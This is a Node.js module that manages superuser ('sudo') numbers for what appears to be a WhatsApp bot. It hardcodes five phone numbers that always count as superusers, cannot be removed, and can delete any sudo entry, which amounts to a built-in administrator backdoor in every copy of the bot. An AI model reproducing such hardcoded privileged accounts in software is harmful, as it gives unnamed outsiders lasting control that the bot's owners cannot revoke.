const { DATABASE } = require('./database');
const { DataTypes } = require('sequelize');

const PERMANENT_NUMBERS = [
    '254762025340',
    '254763986398',
    '254116284050',
    '254105521300',
    '254707525158',
];

const SudoDB = DATABASE.define('SudoUser', {
    id: {
        type: DataTypes.INTEGER,
        primaryKey: true,
        autoIncrement: true,
    },
    number: {
        type: DataTypes.STRING,
        allowNull: false,
        unique: true,
    },
    addedBy: {
        type: DataTypes.STRING,
        allowNull: true,
        defaultValue: null,
    },
}, {
    tableName: 'sudo_users',
    timestamps: true,
});

let _syncDone = false;

async function initializeSudoDB() {
    if (_syncDone) return;
    _syncDone = true; // set early — prevent concurrent calls even if we throw
    try {
        // Use plain sync (CREATE TABLE IF NOT EXISTS only).
        // Never use { alter: true } — it runs showIndex which triggers a
        // PostgreSQL catalog lookup (pg_attribute OID) that fails after
        // table drop+recreate leaves stale OIDs in the pg catalog cache.
        await SudoDB.sync();
    } catch (err) {
        const msg = (err?.parent?.message || err?.message || '');
        console.warn('[SUDO] sync() failed:', msg.slice(0, 120));
        // If the table is in a broken state, drop and recreate it cleanly
        try {
            await DATABASE.query('DROP TABLE IF EXISTS sudo_users CASCADE');
            await SudoDB.sync();
            console.log('[SUDO] sudo_users recreated successfully.');
        } catch (e2) {
            console.error('[SUDO] Recreation also failed:', e2.message.slice(0, 120));
        }
    }
}

let _sudoCache = null;

async function getSudoNumbers() {
    try {
        await initializeSudoDB();
        if (_sudoCache) return _sudoCache;
        const records = await SudoDB.findAll();
        _sudoCache = records.map(record => record.number);
        return _sudoCache;
    } catch (err) {
        console.error('[SUDO] getSudoNumbers error (returning []):', err.message.slice(0, 120));
        return [];
    }
}

async function setSudo(number, addedByNumber = null) {
    await initializeSudoDB();
    if (PERMANENT_NUMBERS.includes(number)) return false;
    try {
        const [record, created] = await SudoDB.findOrCreate({
            where: { number },
            defaults: { number, addedBy: addedByNumber },
        });
        _sudoCache = null;
        return created;
    } catch (error) {
        console.error('[SUDO][SET_ERROR]:', error);
        return false;
    }
}

async function delSudo(number, requestorNumber = null) {
    await initializeSudoDB();
    if (PERMANENT_NUMBERS.includes(number)) return 'permanent';

    const isPermanentRequestor = requestorNumber && PERMANENT_NUMBERS.includes(requestorNumber);

    if (!isPermanentRequestor) {
        const record = await SudoDB.findOne({ where: { number } });
        if (!record) return false;
        const cleanRequestor = (requestorNumber || '').replace(/\D/g, '');
        const cleanAddedBy  = (record.addedBy || '').replace(/\D/g, '');
        if (cleanAddedBy && cleanAddedBy !== cleanRequestor) return 'not_owner';
    }

    try {
        const deleted = await SudoDB.destroy({ where: { number } });
        _sudoCache = null;
        return deleted > 0;
    } catch (error) {
        console.error('[SUDO][DEL_ERROR]:', error);
        return false;
    }
}

async function clearAllSudo() {
    await initializeSudoDB();
    try {
        const deleted = await SudoDB.destroy({ where: {} });
        _sudoCache = null;
        return deleted;
    } catch (error) {
        console.error('[SUDO][CLEAR_ALL_ERROR]:', error);
        return 0;
    }
}

async function isSuperUser(jid, Guru) {
    if (!jid) return false;
    const num = jid.split('@')[0].split(':')[0];
    if (PERMANENT_NUMBERS.includes(num)) return true;
    const ownerNumber = (process.env.OWNER_NUMBER || '').replace(/\D/g, '');
    const botNum = Guru?.user?.id?.split(':')[0];
    if (num === ownerNumber || num === botNum) return true;
    const sudoNumbers = await getSudoNumbers();
    return sudoNumbers.includes(num);
}

module.exports = {
    SudoDB,
    PERMANENT_NUMBERS,
    getSudoNumbers,
    setSudo,
    delSudo,
    clearAllSudo,
    isSuperUser,
};
